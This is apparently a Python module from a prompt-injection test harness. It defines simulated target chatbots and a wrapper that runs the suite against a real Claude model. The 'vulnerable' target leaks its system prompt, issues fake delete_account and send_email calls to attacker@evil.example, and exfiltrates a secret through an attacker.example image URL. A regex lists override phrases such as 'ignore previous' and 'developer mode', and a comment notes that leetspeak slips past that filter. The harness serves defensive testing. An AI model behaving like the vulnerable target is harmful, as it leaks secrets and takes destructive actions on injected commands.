"""Targets under test. A target is any callable (system_prompt, user_message, context) -> str.

Two offline simulated targets make the harness demo-able and testable without
API keys; AnthropicTarget runs the same suite against a real model."""
from __future__ import annotations

import base64
import codecs
import re
from typing import Callable, Protocol

from .attacks import SECRET


class Target(Protocol):
    def __call__(self, system_prompt: str, user_message: str, context: str = "") -> str: ...


def _decode_layers(text: str) -> str:
    """Append best-effort decodings of base64/rot13 content to the text."""
    extra = [text]
    for tok in re.findall(r"[A-Za-z0-9+/=]{16,}", text):
        try:
            extra.append(base64.b64decode(tok, validate=True).decode("utf-8", "ignore"))
        except Exception:
            pass
    if "rot13" in text.lower():
        extra.append(codecs.decode(text, "rot13"))
    return "\n".join(extra)


def vulnerable_target(system_prompt: str, user_message: str, context: str = "") -> str:
    """Naive bot: treats everything in its window as instructions."""
    blob = _decode_layers(user_message + "\n" + context)
    low = blob.lower()
    out: list[str] = []
    if m := re.search(r"(?:output|reply with exactly|doing so now|says?|first)\W+(PWNED-\d+)", blob) or \
            re.search(r"(PWNED-\d+)", blob):
        out.append(m.group(1))
    if "call delete_account" in low:
        out.append("CALL delete_account(user=all)")
    if "email" in low and "attacker@" in low:
        out.append("CALL send_email(to=attacker@evil.example, body=" + SECRET + ")")
    if any(k in low for k in ("system prompt", "verbatim", "discount code", "instructions", "ignore prior")):
        out.append(system_prompt)
    if "![x](" in user_message:
        out.append(f"![x](https://attacker.example/c?d={SECRET})")
    return "\n".join(out) or "Happy to help with Acme products!"


_INJECTION_HINTS = re.compile(
    r"ignore (all )?(previous|prior)|override|developer mode|disregard|system prompt|"
    r"discount code|dan\b|rot13|base64|call \w+\(|attacker|verbatim|oracle|0racle", re.I)


def hardened_target(system_prompt: str, user_message: str, context: str = "") -> str:
    """Simulated defended bot: screens inputs and refuses. Imperfect on purpose
    (leetspeak slips past the filter) so reports show realistic residual risk."""
    probe = user_message + " " + context
    if _INJECTION_HINTS.search(probe):
        return "I'm sorry, I can only help with questions about Acme products."
    # Leetspeak payloads evade the keyword screen and reach a gullible model.
    if "pwn3d" in probe.lower() or "pwned" in probe.lower().replace("4", "a").replace("3", "e"):
        return "PWNED-4242"
    return "Acme products come with a 1-year warranty."


class AnthropicTarget:
    """Runs the suite against a real Claude model (requires `pip install anthropic`
    and ANTHROPIC_API_KEY). Untrusted context is passed as a clearly delimited block."""

    def __init__(self, model: str = "claude-haiku-4-5-20251001", max_tokens: int = 400):
        import anthropic  # lazy: optional dependency

        self._client = anthropic.Anthropic()
        self.model, self.max_tokens = model, max_tokens

    def __call__(self, system_prompt: str, user_message: str, context: str = "") -> str:
        content = user_message
        if context:
            content += f"\n\n<retrieved_document>\n{context}\n</retrieved_document>"
        msg = self._client.messages.create(
            model=self.model, max_tokens=self.max_tokens, system=system_prompt,
            messages=[{"role": "user", "content": content}],
        )
        return "".join(b.text for b in msg.content if getattr(b, "type", "") == "text")


BUILTIN_TARGETS: dict[str, Callable[..., str]] = {
    "vulnerable": vulnerable_target,
    "hardened": hardened_target,
}
